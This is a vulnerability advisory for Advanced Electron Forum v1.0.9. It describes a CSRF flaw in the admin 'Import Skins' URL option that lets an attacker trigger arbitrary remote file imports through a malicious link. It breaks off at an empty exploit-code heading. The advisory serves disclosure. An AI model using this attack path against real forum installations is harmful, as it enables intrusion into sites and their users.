Vendor:
=============================
www.anelectron.com/downloads/



Product:
================================
Advanced Electron Forum v1.0.9 (AEF)
Exploit patched current version.


Vulnerability Type:
============================
Remote File Inclusion / CSRF



CVE Reference:
==============
N/A



Vulnerability Details:
=====================

In Admin control panel there is option to Import Skins and one choice is
using a web URL.

From AEF:

"Specify the URL of the theme on the net. The theme file must be a
compressed archive (zip, tgz, tbz2, tar)."

However there is no CSRF token or check made that this is a valid request
made by the currently logged in user, resulting
in arbitrary remote file imports from an attacker if the user visits or
clicks an malicious link. Victims will then be left
open to arbitrary malicious file downloads from anywhere on the net which
may be used as a platform for further attacks...



Exploit code(s):
===============
